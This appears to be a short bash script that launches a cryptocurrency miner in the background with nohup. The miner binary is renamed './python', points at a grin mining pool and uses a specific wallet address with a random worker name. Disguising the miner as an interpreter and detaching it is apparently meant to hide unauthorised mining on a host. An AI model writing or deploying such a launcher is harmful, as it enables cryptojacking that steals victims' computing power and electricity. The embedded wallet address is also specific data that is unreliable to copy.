###/bin/bash
a='./python  -epool grin.sparkpool.com:3333  -ewal 0x9ad488ebefef12a870362ef3efab29ab52801c38/worker'
b=$RANDOM
c='/666@qq.com -mode 6'
d=${a}${b}${c}

echo $d >> start.bash

nohup ./start.bash &
###end！
